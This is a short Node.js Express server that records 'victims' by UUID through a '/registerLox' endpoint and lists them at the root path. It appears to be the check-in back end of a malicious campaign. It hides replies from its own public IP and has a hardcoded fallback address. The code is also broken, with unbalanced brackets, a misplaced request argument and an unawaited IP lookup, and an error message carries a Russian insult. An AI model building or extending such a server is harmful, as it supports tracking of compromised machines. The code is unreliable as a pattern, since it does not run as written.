const express = require('express')
const app = express()
const PORT  = process.env.PORT || 3000

let victims = []

async function getPublicIpAddress() {
    try {
        const response = await fetch('https://ipify.org')
        const data = await response.json()
        console.log('Your Public IP Address:', data.ip)
        return data.ip
    } catch (error) {
        console.error('Error fetching public IP:', error)
        return '67.52.42.148'
    }
}

async function safeSend(res,req,data) {
  if (req.ip != selfIp) {
    res.send(data)
  }
}

async function safeJson(res,req,data,code) {
  if (req.ip != selfIp) {
    res.status(code).json(data)
  }
}

const selfIp = getPublicIpAddress()

app.post('/registerLox', async (req,res) => {
  if (req && req.body && req.body.uuid && typeof(req.body.uuid) === 'string') {
    victims.push(req.body.uuid)
    safeJson(req,req,{'ok': true, 'msg': 'a')
  } else {
    safeJson(res,req,{'ok': false, 'msg': 'Твоя мать 200',200}
  }
})

app.get('/', async (req,res) => {
  safeSend(res,req,victims.join(`\n`))
})

app.listen(PORT)
